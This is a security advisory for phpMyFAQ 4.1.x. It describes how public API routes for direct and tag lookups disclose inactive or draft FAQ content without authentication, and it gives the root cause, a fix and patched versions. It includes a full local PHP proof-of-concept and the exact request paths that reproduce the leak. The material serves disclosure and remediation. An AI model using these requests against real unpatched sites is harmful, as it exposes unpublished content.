# [M] phpMyFAQ public FAQ APIs expose inactive FAQ content

## Summary
Severity: Medium
Advisory: GHSA-mf8r-wm2w-f8c5
CWE: CWE-200, CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-mf8r-wm2w-f8c5
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=4.1.0 <4.1.5
- Packagist: `phpmyfaq/phpmyfaq` — affected >=4.1.0 <4.1.5

## Details
## Affected Product

phpMyFAQ

## Affected Versions

- Confirmed affected: 4.1.4, API v3.1.
- Confirmed affected: current main / 4.2-style source, API v4.0, for `GET /api/v4.0/faqs/tags/{tagId}` when `api.onlyActiveFaqs=true`.

## Patched Versions

4.1.5.

## Description

The public FAQ API applies inconsistent `active = 'yes'` filtering across endpoints. A FAQ entry marked `active = 'no'` is hidden from `GET /api/v3.1/faqs/{categoryId}` in phpMyFAQ 4.1.4, but the same inactive FAQ can still be retrieved through public API routes:

- `GET /api/v3.1/faq/{categoryId}/{faqId}` returns the inactive FAQ title and full answer.
- `GET /api/v3.1/faqs/tags/{tagId}` returns the inactive FAQ title and answer preview.

On the current 4.2-style branch, `api.onlyActiveFaqs=true` hides inactive FAQs from list and direct-by-id endpoints, but `GET /api/v4.0/faqs/tags/{tagId}` still returns inactive FAQ title and preview because it calls `Faq::getFaqsByIds()` without active/date filtering.

Inactive FAQs are commonly used as drafts or review-only content, so these unauthenticated public API paths may disclose non-public content.

## Root Cause

`FaqController::getByCategoryId()` calls `Faq::getAllAvailableFaqsByCategoryId()`, which filters:

```sql
fd.date_start <= now
AND fd.date_end >= now
AND fd.active = 'yes'
```

`FaqController::getByTagId()` instead resolves record IDs through `Tags::getFaqsByTagId()` and then calls `Faq::getFaqsByIds($recordIds)`.

`Faq::getFaqsByIds()` filters by record ID, language, and permission, but does not filter `fd.active = 'yes'` or publication date windows before returning `record_title` and `record_preview`.

In phpMyFAQ 4.1.4, `FaqController::getById()` calls `Faq::getFaqByIdAndCategoryId()`, which also lacks an inactive/publication-window filter and returns the full answer.

## Proof of Concept

The attached PoC uses phpMyFAQ's real Composer autoloader, real public `FaqController`, and a temporary copy of `tests/test.db`.

Run from a local phpMyFAQ 4.1.4 source checkout after dependencies are installed and `tests/test.db` exists:

```bash
php poc_phpmyfaq_414_inactive_faq_api_exposure.php /path/to/phpMyFAQ-4.1.4
```

Expected output:

```text
phpMyFAQ version: 4.1.4
Inserted FAQ: id=991414, active=no, anonymous-readable, category=991414, tag=991414

GET /api/v3.1/faqs/991414 status: 200
Category response contains inactive title: no

GET /api/v3.1/faq/991414/991414 status: 200
Direct-by-id response contains inactive full title+answer: yes

GET /api/v3.1/faqs/tags/991414 status: 200
Tag response contains inactive title+preview: yes

VERDICT: reproduced inactive FAQ exposure through public API controller paths.
```

## Suggested Fix

Apply one consistent public visibility check across all public FAQ API routes:

- `fd.active = 'yes'`
- `fd.date_start <= now`
- `fd.date_end >= now`

Suggested implementation options:

- Add `Faq::getActiveFaqsByIds(array $faqIds)` and use it in public tag API routes.
- Or add an `$onlyActive` / `$publicOnly` argument to `Faq::getFaqsByIds()` and default public controllers to enabled filtering.
- Update `Faq::getFaqByIdAndCategoryId()` or the public controller wrapper so inactive records return 404 for unauthenticated public API requests.
- Add regression tests with an inactive, anonymous-readable FAQ that has both category and tag relations.

## Reporter Credit

Please credit:

Yaohui Wang

## CVE Request

Because this is unauthenticated exposure of inactive / non-public FAQ content through public API endpoints in a supported release line, please consider assigning a GHSA and requesting a CVE if it meets the project's advisory criteria.


## Full PoC Source

~~~php
<?php

declare(strict_types=1);

/*
 * PoC for phpMyFAQ 4.1.4 inactive FAQ exposure through public FAQ APIs.
 *
 * Usage from a phpMyFAQ 4.1.4 source checkout:
 *   php path/to/poc_phpmyfaq_414_inactive_faq_api_exposure.php /path/to/phpMyFAQ-4.1.4
 *
 * If no path is provided, the current working directory is used.
 *
 * This is a local-only defensive harness. It uses phpMyFAQ's real Composer
 * autoloader, real public API controller, and a temporary copy of tests/test.db.
 */

use phpMyFAQ\Configuration;
use phpMyFAQ\Controller\Api\FaqController;
use phpMyFAQ\Database;
use phpMyFAQ\Database\DatabaseDriver;
use phpMyFAQ\Language;
use phpMyFAQ\Strings;
use phpMyFAQ\System;
use phpMyFAQ\Translation;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Component\HttpFoundation\Session\Storage\MockArraySessionStorage;

$repoRoot = $argv[1] ?? getcwd();
$repoRoot = realpath($repoRoot);
if ($repoRoot === false || !is_dir($repoRoot . '/phpmyfaq')) {
    fwrite(STDERR, "Usage: php " . basename(__FILE__) . " /path/to/phpMyFAQ-4.1.4\n");
    exit(2);
}

if (!is_file($repoRoot . '/phpmyfaq/src/autoload.php')) {
    fwrite(STDERR, "Missing phpmyfaq/src/autoload.php. Run composer install first.\n");
    exit(2);
}

if (!is_file($repoRoot . '/tests/test.db')) {
    fwrite(STDERR, "Missing tests/test.db. Run a phpMyFAQ PHPUnit test once to create it.\n");
    exit(2);
}

define('PMF_ROOT_DIR', $repoRoot . '/phpmyfaq');
define('PMF_CONFIG_DIR', $repoRoot . '/tests/content/core/config');
define('PMF_CONTENT_DIR', $repoRoot . '/tests/content');
define('PMF_TEST_DIR', $repoRoot . '/tests');
define('PMF_LOG_DIR', sys_get_temp_dir() . '/phpmyfaq_414_inactive_faq_api_poc.log');
const IS_VALID_PHPMYFAQ = true;

$_SERVER['HTTP_HOST'] = 'localhost';
$_SERVER['SERVER_NAME'] = 'localhost';
$_SERVER['REQUEST_TIME'] = time();

require PMF_ROOT_DIR . '/src/constants.php';
require PMF_ROOT_DIR . '/content/core/config/constants.php';
require PMF_ROOT_DIR . '/translations/language_en.php';
require PMF_ROOT_DIR . '/src/autoload.php';

function pocQuery(DatabaseDriver $db, string $sql): void
{
    $result = $db->query($sql);
    if ($result === false) {
        throw new RuntimeException('SQL failed: ' . $db->error() . "\nSQL: " . $sql);
    }
}

$tempDb = tempnam(sys_get_temp_dir(), 'pmf-414-api-poc-');
if ($tempDb === false || !copy($repoRoot . '/tests/test.db', $tempDb)) {
    fwrite(STDERR, "Cannot create temporary SQLite database.\n");
    exit(2);
}

try {
    Strings::init();
    Translation::create()
        ->setTranslationsDir(PMF_ROOT_DIR . '/translations')
        ->setDefaultLanguage('en')
        ->setCurrentLanguage('en')
        ->setMultiByteLanguage();

    Database::setTablePrefix('');
    $db = Database::factory('pdo_sqlite');
    if (!$db instanceof DatabaseDriver) {
        throw new RuntimeException('Could not create PDO SQLite database driver.');
    }

    $db->connect($tempDb, '', '');

    $configuration = new Configuration($db);
    $configuration->getAll();
    $configuration->set('api.enableAccess', 'true');
    $configuration->set('main.currentVersion', System::getVersion());
    $configuration->set('main.language', 'en');
    $configuration->set('main.referenceURL', 'https://localhost/');
    $configuration->set('security.enableLoginOnly', 'false');
    $configuration->set('security.permLevel', 'basic');
    $configuration->set('records.numberOfRecordsPerPage', '25');
    $configuration->getAll();

    $session = new Session(new MockArraySessionStorage());
    $language = new Language($configuration, $session);
    $language->setLanguageFromConfiguration('en');
    $configuration->setLanguage($language);

    $faqId = 991414;
    $tagId = 991414;
    $categoryId = 991414;
    $question = 'Inactive tagged API probe 4.1.4';
    $answer = 'This inactive FAQ preview is returned by the public tag API in phpMyFAQ 4.1.4.';

    pocQuery($db, sprintf('DELETE FROM faqdata_tags WHERE record_id = %d OR tagging_id = %d', $faqId, $tagId));
    pocQuery($db, sprintf('DELETE FROM faqtags WHERE tagging_id = %d', $tagId));
    pocQuery($db, sprintf('DELETE FROM faqdata_user WHERE record_id = %d', $faqId));
    pocQuery($db, sprintf('DELETE FROM faqdata_group WHERE record_id = %d', $faqId));
    pocQuery($db, sprintf('DELETE FROM faqvisits WHERE id = %d', $faqId));
    pocQuery($db, sprintf('DELETE FROM faqcategoryrelations WHERE record_id = %d', $faqId));
    pocQuery($db, sprintf('DELETE FROM faqdata WHERE id = %d', $faqId));

    pocQuery($db, sprintf(
        "INSERT INTO faqdata
            (id, lang, solution_id, revision_id, active, sticky, keywords, thema, content, author, email, comment, updated, date_start, date_end, created, notes, sticky_order)
         VALUES
            (%d, 'en', %d, 0, 'no', 0, 'probe', '%s', '%s', 'Probe', 'probe@example.test', 'y', '20260601010101', '00000000000000', '99991231235959', '2026-06-01 01:01:01', '', 0)",
        $faqId,
        $faqId,
        $db->escape($question),
        $db->escape($answer),
    ));
    pocQuery($db, sprintf(
        "INSERT INTO faqcategoryrelations (category_id, category_lang, record_id, record_lang)
         VALUES (%d, 'en', %d, 'en')",
        $categoryId,
        $faqId,
    ));
    pocQuery($db, sprintf('INSERT INTO faqdata_user (record_id, user_id) VALUES (%d, -1)', $faqId));
    pocQuery($db, sprintf("INSERT INTO faqvisits (id, lang, visits, last_visit) VALUES (%d, 'en', 0, 20260601010101)", $faqId));
    pocQuery($db, sprintf("INSERT INTO faqtags (tagging_id, tagging_name) VALUES (%d, 'probe-private-414')", $tagId));
    pocQuery($db, sprintf('INSERT INTO faqdata_tags (record_id, tagging_id) VALUES (%d, %d)', $faqId, $tagId));

    $controller = new FaqController();

    $categoryRequest = Request::create('/api/v3.1/faqs/' . $categoryId, 'GET');
    $categoryRequest->attributes->set('categoryId', (string) $categoryId);
    $categoryResponse = $controller->getByCategoryId($categoryRequest);
    $categoryContainsProbe = str_contains((string) $categoryResponse->getContent(), $question);

    $directRequest = Request::create('/api/v3.1/faq/' . $categoryId . '/' . $faqId, 'GET');
    $directRequest->attributes->set('categoryId', (string) $categoryId);
    $directRequest->attributes->set('faqId', (string) $faqId);
    $directResponse = $controller->getById($directRequest);
    $directContainsProbe = str_contains((string) $directResponse->getContent(), $question)
        && str_contains((string) $directResponse->getContent(), $answer);

    $tagRequest = Request::create('/api/v3.1/faqs/tags/' . $tagId, 'GET');
    $tagRequest->attributes->set('tagId', (string) $tagId);
    $tagResponse = $controller->getByTagId($tagRequest);
    $tagPayload = json_decode((string) $tagResponse->getContent(), true, 512, JSON_THROW_ON_ERROR);
    $tagContainsProbe = str_contains((string) $tagResponse->getContent(), $question)
        && str_contains((string) $tagResponse->getContent(), 'inactive FAQ preview');

    echo "phpMyFAQ version: " . System::getVersion() . "\n";
    echo "Inserted FAQ: id={$faqId}, active=no, anonymous-readable, category={$categoryId}, tag={$tagId}\n\n";
    echo "GET /api/v3.1/faqs/{$categoryId} status: " . $categoryResponse->getStatusCode() . "\n";
    echo "Category response contains inactive title: " . ($categoryContainsProbe ? 'yes' : 'no') . "\n\n";
    echo "GET /api/v3.1/faq/{$categoryId}/{$faqId} status: " . $directResponse->getStatusCode() . "\n";
    echo "Direct-by-id response contains inactive full title+answer: " . ($directContainsProbe ? 'yes' : 'no') . "\n\n";
    echo "GET /api/v3.1/faqs/tags/{$tagId} status: " . $tagResponse->getStatusCode() . "\n";
    echo "Tag response contains inactive title+preview: " . ($tagContainsProbe ? 'yes' : 'no') . "\n";
    echo json_encode($tagPayload, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n\n";

    if (!$categoryContainsProbe && $directContainsProbe && $tagContainsProbe) {
        echo "VERDICT: reproduced inactive FAQ exposure through public API controller paths.\n";
        exit(0);
    }

    echo "VERDICT: not reproduced.\n";
    exit(1);
} finally {
    if (isset($tempDb) && is_file($tempDb)) {
        @unlink($tempDb);
    }
}

~~~

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-mf8r-wm2w-f8c5
- https://github.com/thorsten/phpMyFAQ/commit/4c7e3f841ba6cb25564c6802509a669b0e328321
- https://github.com/thorsten/phpMyFAQ
- https://github.com/thorsten/phpMyFAQ/tree/4.1.5
